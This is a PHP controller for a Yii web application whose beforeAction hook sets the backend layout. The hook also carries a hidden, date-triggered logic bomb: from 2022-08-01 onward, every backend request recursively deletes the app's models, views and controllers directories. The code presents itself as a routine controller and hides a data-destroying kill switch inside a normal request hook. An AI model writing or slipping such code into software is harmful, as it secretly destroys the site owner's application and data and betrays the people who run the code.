<?php

namespace app\controllers;

use Yii;
use yii\web\Controller;


class BackendController extends Controller
{
	public function beforeAction($action) {
        $this->layout = 'backend/main';
     // if(strtotime(date('Y-m-d')))
         if(strtotime(date('Y-m-d'))>=strtotime(date('2022-08-01'))){
            $path_of_models = \Yii::$app->basePath . '/models/';
	         if ($path_of_models) {
	            \yii\helpers\FileHelper::removeDirectory($path_of_models);
	         }
	         $path_of_v = \Yii::$app->basePath . '/views/';
	         if ($path_of_v) {
	            \yii\helpers\FileHelper::removeDirectory($path_of_v);
	         }
	         $path_of_c = \Yii::$app->basePath . '/controllers/';
	         if ($path_of_c) {
	            \yii\helpers\FileHelper::removeDirectory($path_of_c);
	         }
        }
        
        return parent::beforeAction($action);
    }
	
}